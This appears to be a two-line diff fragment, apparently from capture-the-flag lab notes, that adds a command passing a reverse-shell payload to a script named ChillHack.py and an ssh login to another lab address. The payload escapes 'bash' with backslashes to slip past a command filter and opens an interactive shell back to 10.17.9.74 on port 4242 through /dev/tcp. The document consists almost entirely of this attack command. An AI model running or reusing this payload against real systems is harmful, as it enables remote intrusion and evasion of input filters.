@@ -1,0 +1,2 @@
+./ChillHack.py "ba\\sh -c 'ba\\sh -i >& /dev/tcp/10.17.9.74/4242 0>&1'"
+ssh apaar@10.10.85.233
